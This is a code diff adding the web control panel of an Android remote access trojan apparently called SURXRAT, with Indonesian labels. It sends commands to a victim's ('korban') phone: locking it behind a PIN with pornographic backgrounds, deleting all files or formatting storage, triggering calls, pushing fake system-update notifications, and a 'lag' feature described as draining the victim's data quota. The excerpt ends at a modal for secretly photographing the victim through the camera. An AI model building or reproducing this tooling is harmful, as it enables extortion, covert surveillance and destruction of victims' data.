+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <path
+                                d="M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42" />
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Nyalakan Senter</div>
+                        <div class="ctrl-desc">Kontrol flashlight device</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Vibration -->
+                <!-- Vibration -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('vib', 'Getarkan Perangkat', 'Durasi (detik)', 'number', '2')">
+                    <div class="ctrl-icon purple-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 2a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1 1 1 0 0 1-1-1V3a1 1 0 0 1 1-1z"></path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Getarkan Perangkat</div>
+                        <div class="ctrl-desc">Vibrate dengan durasi custom</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Toast -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('toast', 'Teks Layar', 'Masukkan teks pesan', 'text', 'Halo dari SURXRAT!')">
+                    <div class="ctrl-icon emerald-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path
+                                d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z">
+                            </path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Teks Layar</div>
+                        <div class="ctrl-desc">Tampilkan toast message</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- TTS -->
+                <!-- TTS -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('voi', 'Kirim Suara', 'Masukkan teks suara', 'text', 'Halo, ini pesan dari Google')">
+                    <div class="ctrl-icon amber-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path>
+                            <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Kirim Suara</div>
+                        <div class="ctrl-desc">Text-to-Speech Google</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Kunci HP -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('lock', 'Kunci HP', 'Pesan Layar', 'text', 'LOCK BY SURXRAT', 'PIN Unlock', '1234')">
+                    <div class="ctrl-icon red-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Kunci HP</div>
+                        <div class="ctrl-desc">Lock target dengan PIN</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Unlock HP -->
+                <div class="ctrl-card" onclick="window.sendControl('unlock')">
+                    <div class="ctrl-icon emerald-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Unlock HP</div>
+                        <div class="ctrl-desc">Buka kunci layar remote</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+
+
+                <!-- Call -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('call', 'Panggil Nomor', 'Masukkan Nomor HP', 'tel', '08123456789')">
+                    <div class="ctrl-icon cyan-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path
+                                d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z">
+                            </path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Panggil Nomor</div>
+                        <div class="ctrl-desc">Trigger phone call</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Wallpaper -->
+                <!-- Wallpaper -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('wal', 'Ganti Wallpaper', 'Masukkan Link Gambar', 'url', 'https://example.com/wp.jpg')">
+                    <div class="ctrl-icon rose-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                            <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                            <polyline points="21 15 16 10 5 21"></polyline>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Ganti Wallpaper</div>
+                        <div class="ctrl-desc">Change homescreen bg</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Music -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('ply', 'Putar Musik', 'Masukkan Link Audio/MP3', 'url', 'https://example.com/song.mp3')">
+                    <div class="ctrl-icon purple-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M9 18V5l12-2v13"></path>
+                            <circle cx="6" cy="18" r="3"></circle>
+                            <circle cx="18" cy="16" r="3"></circle>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Putar Musik</div>
+                        <div class="ctrl-desc">Play audio dari URL</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Lag Sinyal -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('lag', 'Lag Sinyal', 'Durasi (detik)', 'number', '10')">
+                    <div class="ctrl-icon purple-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 12h-4l-3 9L9 3l-3 9H2"></path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Lag Sinyal</div>
+                        <div class="ctrl-desc">Atur kelancaran game target</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Notification -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('not', 'Kirim Notifikasi', 'Isi Pesan Notifikasi', 'text', 'System Update Available')">
+                    <div class="ctrl-icon amber-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                            <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Kirim Notifikasi</div>
+                        <div class="ctrl-desc">Push notification</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Format Storage -->
+                <!-- Delete File -->
+                <div class="ctrl-card" onclick="window.sendControl('delf')">
+                    <div class="ctrl-icon red-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polyline points="3 6 5 6 21 6"></polyline>
+                            <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2">
+                            </path>
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Hapus Semua File</div>
+                        <div class="ctrl-desc">menghapus semua storage</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- iOS Input Modal -->
+    <div class="ios-input-modal" id="ios-input-modal">
+        <div class="ios-input-card">
+            <div class="ios-input-header">
+                <div class="ios-input-icon" id="input-modal-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="5"></circle>
+                    </svg>
+                </div>
+                <div>
+                    <div class="ios-input-title" id="input-modal-title">Fitur Kontrol</div>
+                    <div class="ios-input-subtitle" id="input-modal-subtitle">Masukkan parameter</div>
+                </div>
+            </div>
+
+            <div class="ios-floating-input" id="ios-input-group-1">
+                <input type="text" id="ios-control-input" placeholder=" ">
+                <label id="ios-control-label">Masukkan nilai</label>
+            </div>
+
+            <div class="ios-floating-input hidden" id="ios-input-group-2" style="margin-top: 15px;">
+                <input type="text" id="ios-control-input-2" placeholder=" ">
+                <label id="ios-control-label-2">Masukkan nilai 2</label>
+            </div>
+
+            <!-- Lock BG Option -->
+            <div id="ios-input-group-3" class="hidden">
+
+                <!-- PIN Input -->
+                <div class="lock-field-group" style="margin-top: 14px;">
+                    <div class="lock-field-label">
+                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        PIN Unlock
+                    </div>
+                    <div class="ios-floating-input" style="margin-top: 6px; margin-bottom: 0;">
+                        <input type="text" id="ios-control-input-pin" placeholder=" " inputmode="numeric" maxlength="4"
+                            style="letter-spacing: 0.2em; font-weight: 700;">
+                        <label>Masukkan PIN</label>
+                    </div>
+                </div>
+
+                <!-- Background Lock -->
+                <div class="lock-field-group" style="margin-top: 16px;">
+                    <div class="lock-field-label">
+                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5">
+                            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                            <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                            <polyline points="21 15 16 10 5 21"></polyline>
+                        </svg>
+                        Background Lock Screen
+                    </div>
+                    <div class="lock-bg-options" style="margin-top: 8px;">
+                        <label class="lock-bg-option" id="lock-opt-black">
+                            <input type="radio" name="lock-bg" value="black" checked
+                                onchange="window.onLockBgChange(this.value)">
+                            <span class="lock-bg-option-inner">
+                                <span class="lock-bg-swatch"
+                                    style="background:#111;border:1.5px solid rgba(255,255,255,0.15);"></span>
+                                <span>Hitam</span>
+                            </span>
+                        </label>
+                        <label class="lock-bg-option" id="lock-opt-random">
+                            <input type="radio" name="lock-bg" value="random"
+                                onchange="window.onLockBgChange(this.value)">
+                            <span class="lock-bg-option-inner">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
+                                    <polyline points="16 3 21 3 21 8"></polyline>
+                                    <line x1="4" y1="20" x2="21" y2="3"></line>
+                                    <polyline points="21 16 21 21 16 21"></polyline>
+                                    <line x1="15" y1="15" x2="21" y2="21"></line>
+                                </svg>
+                                <span>Bokep</span>
+                            </span>
+                        </label>
+                        <label class="lock-bg-option" id="lock-opt-url">
+                            <input type="radio" name="lock-bg" value="url" onchange="window.onLockBgChange(this.value)">
+                            <span class="lock-bg-option-inner">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
+                                    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+                                    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+                                </svg>
+                                <span>Custom URL</span>
+                            </span>
+                        </label>
+                    </div>
+
+                    <div id="ios-lock-url-container" style="display: none; margin-top: 10px;">
+                        <div class="ios-floating-input" style="margin-bottom: 0;">
+                            <input type="text" id="ios-control-input-3" placeholder=" ">
+                            <label>URL Gambar</label>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="ios-btn-group" style="flex-wrap: nowrap; margin-top: 24px;">
+                <button class="ios-btn ios-btn-cancel" onclick="closeControlInput()"
+                    style="min-width: 80px;">Batal</button>
+                <button class="ios-btn ios-btn-confirm" onclick="submitControlInput()" style="min-width: 80px;">Ya,
+                    Kirim</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Universal Modal (Required by main.js) -->
+    <div id="universal-modal" class="ios-input-modal hidden" style="display: none;">
+        <div class="ios-input-card">
+            <div class="ios-input-header">
+                <div class="ios-input-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="16" x2="12" y2="12"></line>
+                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                    </svg>
+                </div>
+                <div>
+                    <div class="ios-input-title" id="univ-modal-title">Konfirmasi</div>
+                    <div class="ios-input-subtitle" id="univ-modal-msg">Pesan konfirmasi</div>
+                </div>
+            </div>
+
+            <div class="ios-floating-input hidden" id="univ-input-container">
+                <input type="text" id="univ-input">
+            </div>
+
+            <div class="ios-btn-group" style="flex-wrap: nowrap;">
+                <button class="ios-btn ios-btn-cancel" id="univ-cancel-btn" style="min-width: 80px;">BATAL</button>
+                <button class="ios-btn ios-btn-confirm" id="univ-confirm-btn" style="min-width: 80px;">YA</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Global Toast Notification -->
+    <div id="global-toast" class="toast-ios hidden"></div>
+
+    <!-- Lag Sinyal Selection Modal -->
+    <div class="ios-input-modal" id="lag-sinyal-modal">
+        <div class="ios-input-card" style="max-width: 350px; border-radius: 24px;">
+            <div class="ios-input-header">
+                <div class="ios-input-icon" style="background: rgba(139, 92, 246, 0.1); color: #8b5cf6;">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <div>
+                    <div class="ios-input-title">Lag Sinyal</div>
+                    <div class="ios-input-subtitle">Pilih aplikasi dan tipe lag</div>
+                </div>
+            </div>
+
+            <div id="lag-status-display"
+                style="margin: 10px 0; padding: 12px; border-radius: 12px; background: rgba(0,0,0,0.2); font-size: 0.9rem; text-align: center; color: #f59e0b; font-weight: bold; letter-spacing: 1px;">
+                Status: ✅ NO LAG
+            </div>
+
+            <div class="ios-floating-input" style="margin-bottom: 20px;">
+                <label
+                    style="position: static; font-size: 0.75rem; color: #888; transform: none; margin-bottom: 8px; display: block; font-weight: 600;">PILIH
+                    APLIKASI:</label>
+                <select id="lag-package-select"
+                    style="width: 100%; padding: 14px; border-radius: 14px; background: #2a2a2a; border: 1px solid #3a3a3a; color: white; outline: none; appearance: none; cursor: pointer;">
+                    <option value="com.dts.freefiremax com.dts.freefireth" selected>Semua Free Fire (HINT)</option>
+                    <option value="com.whatsapp com.whatsapp.w4b">WhatsApp (+Business)</option>
+                    <option value="org.telegram.messenger">Telegram</option>
+                    <option value="com.tencent.ig">PUBG Mobile</option>
+                    <option value="com.mobile.legends">Mobile Legends (MLBB)</option>
+                    <option value="all_apk">🔥 SEMUA APLIKASI (Always Lag)</option>
+                </select>
+            </div>
+
+            <div
+                style="background: rgba(245, 158, 11, 0.1); border-radius: 12px; padding: 10px; margin-bottom: 20px; border: 1px dashed rgba(245, 158, 11, 0.3);">
+                <div style="font-size: 0.7rem; color: #f59e0b; display: flex; align-items: center; gap: 5px;">
+                    <svg style="width: 14px; height: 14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
+                        </path>
+                    </svg>
+                    <span style="font-weight: bold;">PENTING!</span>
+                </div>
+                <div style="font-size: 0.65rem; color: #aaa; margin-top: 4px; line-height: 1.3;">
+                    Fitur ini mendownload file besar secara terus menerus. Dapat membuat <b>KUOTA INTERNET KORBAN
+                        HABIS</b> dengan cepat.
+                </div>
+            </div>
+
+            <div style="display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px;">
+                <button onclick="submitLagSinyal('superlag')" class="ios-btn"
+                    style="background: #1e1e1e; color: #f59e0b; border: 1px solid #3a3a3a; padding: 16px; border-radius: 16px; font-weight: bold; font-size: 1rem;">
+                    🔥 SUPER LAG
+                </button>
+                <button onclick="submitLagSinyal('aman')" class="ios-btn"
+                    style="background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 16px; border-radius: 16px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                    <svg style="width: 20px; height: 20px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                    NO LAG (NORMAL)
+                </button>
+            </div>
+
+            <div class="ios-btn-group">
+                <button class="ios-btn ios-btn-cancel" onclick="closeLagSinyal()"
+                    style="background: transparent; border: none; font-size: 1rem; color: #ffffff; opacity: 0.7;">Tutup</button>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        let currentControlCommand = null;
+
+        // Global showToast for all inline scripts
+        window.showToast = function (msg, isError = false) {
+            const toast = document.getElementById('global-toast');
+            if (!toast) return;
+            toast.style.background = isError ? 'rgba(220, 38, 38, 0.8)' : 'rgba(30, 41, 59, 0.8)';
+            toast.innerHTML = `<span>${isError ? '⚠️' : '✅'}</span> ${msg.toUpperCase()}`;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        };
+
+        function toggleControlMenu() {
+            if (!window.activeDeviceId) {
+                window.showToast('Pilih perangkat terlebih dahulu!', true);
+                return;
+            }
+            const grid = document.getElementById('control-grid');
+            grid.classList.toggle('show');
+        }
+
+        function openControlInput(command, title, placeholder, inputType, defaultValue, placeholder2, defaultValue2) {
+            // Double check device is selected
+            if (!window.activeDeviceId) {
+                if (window.showToast) {
+                    window.showToast('Pilih perangkat terlebih dahulu!', true);
+                }
+                return;
+            }
+
+            currentControlCommand = command;
+
+            const modal = document.getElementById('ios-input-modal');
+            const input = document.getElementById('ios-control-input');
+            const label = document.getElementById('ios-control-label');
+            const input2 = document.getElementById('ios-control-input-2');
+            const label2 = document.getElementById('ios-control-label-2');
+            const group2 = document.getElementById('ios-input-group-2');
+            const titleEl = document.getElementById('input-modal-title');
+            const subtitleEl = document.getElementById('input-modal-subtitle');
+
+            titleEl.textContent = title;
+            subtitleEl.textContent = 'Masukkan parameter untuk eksekusi';
+            label.textContent = placeholder;
+            // [FIX] Always use type='text' to prevent browser :invalid red border
+            // (url/tel/number types trigger red border when format doesn't match)
+            input.type = 'text';
+            input.value = defaultValue;
+
+            if (placeholder2) {
+                group2.classList.remove('hidden');
+                label2.textContent = placeholder2;
+                input2.value = defaultValue2 || '';
+                input2.type = 'text';
+            } else {
+                group2.classList.add('hidden');
+            }
+
+            // Handle Custom Lock BG
+            const group3 = document.getElementById('ios-input-group-3');
+            if (command === 'lock') {
+                // [FIX] Hide group2 - PIN is now inside group3
+                group2.classList.add('hidden');
+                group3.classList.remove('hidden');
+                // Reset to default
+                document.getElementById('ios-control-bg-type').value = 'black';
+                document.getElementById('ios-lock-url-container').style.display = 'none';
+                document.getElementById('ios-control-input-3').value = '';
+                // Reset PIN field
+                const pinInput = document.getElementById('ios-control-input-pin');
+                if (pinInput) pinInput.value = defaultValue2 || '1234';
+            } else {
+                group3.classList.add('hidden');
+            }
+
+            modal.classList.add('show');
+            document.getElementById('control-grid').classList.remove('show');
+
+            setTimeout(() => input.focus(), 300);
+        }
+
+        function closeControlInput() {
+            document.getElementById('ios-input-modal').classList.remove('show');
+            currentControlCommand = null;
+        }
+
+        function submitControlInput() {
+            const input = document.getElementById('ios-control-input');
+            let value = input.value.trim();
+
+            if (!value) {
+                if (window.showToast) {
+                    window.showToast('Masukkan nilai terlebih dahulu!');
+                }
+                return;
+            }
+
+            if (currentControlCommand === 'lock') {
+                // [FIX] Read PIN from new dedicated pin input inside group3
+                const pinInput = document.getElementById('ios-control-input-pin');
+                const value2 = pinInput ? pinInput.value.trim() : '';
+                if (!value2) {
+                    if (window.showToast) window.showToast('PIN tidak boleh kosong!');
+                    return;
+                }
+
+                // Add Background URL logic
+                const bgType = document.getElementById('ios-control-bg-type').value;
+                let bgUrl = "clear";
+                if (bgType === 'url') {
+                    bgUrl = document.getElementById('ios-control-input-3').value.trim();
+                } else if (bgType === 'random') {
+                    // Combine with list from main.js if exists
+                    const defaultList = [
+                        'https://i.pinimg.com/736x/21/00/25/210025139a0937a4e924bc01cd20e50f.jpg',
+                        'https://i.pinimg.com/736x/88/c2/f7/88c2f78f870932cb413d3305c4883f3d.jpg',
+                        'https://w0.peakpx.com/wallpaper/101/95/HD-wallpaper-anonymous-hacker-mask-neon.jpg'
+                    ];
+                    const list = (window.lockBackgrounds && window.lockBackgrounds.length > 0) ? window.lockBackgrounds : defaultList;
+
+                    if (list.length > 0) {
+                        bgUrl = list[Math.floor(Math.random() * list.length)];
+                    }
+                }
+
+                value = `${value}|${value2}|${bgUrl}`;
+            }
+
+            if (currentControlCommand && window.activeDeviceId) {
+                if (window.sendControlWithValue) {
+                    window.sendControlWithValue(currentControlCommand, value);
+                    closeControlInput();
+                }
+            } else {
+                if (window.showToast) {
+                    window.showToast('Tidak ada perangkat aktif!');
+                }
+            }
+        }
+
+        function confirmFormatStorage() {
+            if (!window.activeDeviceId) {
+                if (window.showToast) {
+                    window.showToast('Pilih perangkat terlebih dahulu!');
+                }
+                return;
+            }
+
+            const modal = document.getElementById('universal-modal');
+            modal.classList.remove('hidden');
+            document.getElementById('univ-modal-title').innerText = 'PERINGATAN KERAS';
+            document.getElementById('univ-modal-msg').innerText = 'Hapus seluruh data di storage target?';
+            document.getElementById('univ-confirm-btn').onclick = () => {
+                if (window.sendControl) window.sendControl('for');
+                modal.classList.add('hidden');
+            };
+            document.getElementById('univ-cancel-btn').onclick = () => modal.classList.add('hidden');
+        }
+
+        // Close modal on outside click
+        document.getElementById('ios-input-modal').addEventListener('click', function (e) {
+            if (e.target === this) {
+                closeControlInput();
+            }
+        });
+        function openLagSinyal() {
+            if (!window.activeDeviceId) {
+                window.showToast('Pilih perangkat terlebih dahulu!', true);
+                return;
+            }
+
+            // Show current status
+            const dev = window.devices ? window.devices[window.activeDeviceId] : null;
+            if (dev && dev.lag_status) {
+                const lagType = dev.lag_status.toLowerCase();
+                const statusDisplay = document.getElementById('lag-status-display');
+                const isLag = lagType.includes('super');
+                const statusText = isLag ? '🔥 SUPER LAG ACTIVE' : '✅ NO LAG (NORMAL)';
+                statusDisplay.innerText = `Status: ${statusText}`;
+                statusDisplay.style.color = isLag ? '#f59e0b' : '#10b981';
+            }
+
+
+            document.getElementById('lag-sinyal-modal').classList.add('show');
+            document.getElementById('control-grid').classList.remove('show');
+        }
+
+        function closeLagSinyal() {
+            document.getElementById('lag-sinyal-modal').classList.remove('show');
+        }
+
+        function submitLagSinyal(lagType) {
+            if (!window.activeDeviceId) return;
+
+            const pkg = document.getElementById('lag-package-select').value;
+            const statusDisplay = document.getElementById('lag-status-display');
+
+            const statusText = lagType === 'superlag' ? '🔥 SUPER LAG' : '✅ NO LAG';
+            statusDisplay.innerText = `Status: ${statusText}`;
+            statusDisplay.style.color = lagType === 'superlag' ? '#f59e0b' : '#10b981';
+
+
+            if (window.sendLagControl) {
+                window.sendLagControl(pkg, lagType);
+            } else {
+                console.log("Lag Control Direct:", pkg, lagType);
+                // If main.js hasn't loaded the function yet, we can try to find and use the sendControlWithValue logic but customized
+            }
+
+            window.showToast(`Berhasil Set ${statusText}`);
+        }
+
+        // Close lag modal on outside click
+        document.getElementById('lag-sinyal-modal').addEventListener('click', function (e) {
+            if (e.target === this) closeLagSinyal();
+        });
+    </script>
+
+    <!-- File Manager Action Modal (Custom Action Sheet) -->
+    <div class="ios-input-modal" id="fm-action-modal">
+        <div class="ios-input-card" style="border-radius: 28px; padding: 20px;">
+            <div id="fm-modal-title"
+                style="font-weight: 800; font-size: 1rem; color: #fff; margin-bottom: 4px; text-align: center;">File
+                Name</div>
+            <div id="fm-modal-subtitle"
+                style="font-size: 0.65rem; color: #888; margin-bottom: 20px; text-align: center; word-break: break-all;">
+                /path/to/file</div>
+
+            <div id="fm-menu-options" style="display: flex; flex-direction: column; gap: 8px;">
+                <!-- Buttons will be injected -->
+            </div>
+
+            <button onclick="closeFMModal()" class="ios-btn"
+                style="margin-top: 12px; background: rgba(255,255,255,0.05); color: #fff; border: 1px solid rgba(255,255,255,0.1);">BATAL</button>
+        </div>
+    </div>
+
+    <!-- Rename Modal -->
+    <div class="ios-input-modal" id="fm-rename-modal">
+        <div class="ios-input-card">
+            <div class="ios-input-header">
+                <h3>GANTI NAMA</h3>
+                <p>Masukkan nama baru untuk file/folder ini</p>
+            </div>
+            <div class="ios-floating-input">
+                <input type="text" id="input-fm-newname" placeholder="Nama Baru">
+            </div>
+            <div style="display: flex; gap: 12px; margin-top: 20px;">
+                <button id="btn-fm-rename-confirm" class="ios-btn">SIMPAN</button>
+                <button onclick="closeFMRenameModal()" class="ios-btn cancel">BATAL</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- STEP ID: 512 - Camera Secret Viewer Modal -->
+    <!-- STEP ID: 512 - Camera Secret Viewer Modal (FULL SCREEN VERSION) -->
+    <div id="cam-viewer-modal" class="hidden">
+        <div class="fs-cam-container">
+            <!-- Header -->
+            <div class="fs-cam-header">
+                <div class="fs-cam-title">POTRET KORBAN DIAM DIAM</div>
+                <div class="fs-live-badge">DEV BY SISURYAOFFICIAL</div>
+            </div>
+
+            <!-- Main Viewport -->
+            <div class="fs-cam-viewport">
+                <div id="cam-placeholder" class="fs-cam-placeholder">
+                    <div class="fs-cam-icon-large">
+                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="1">
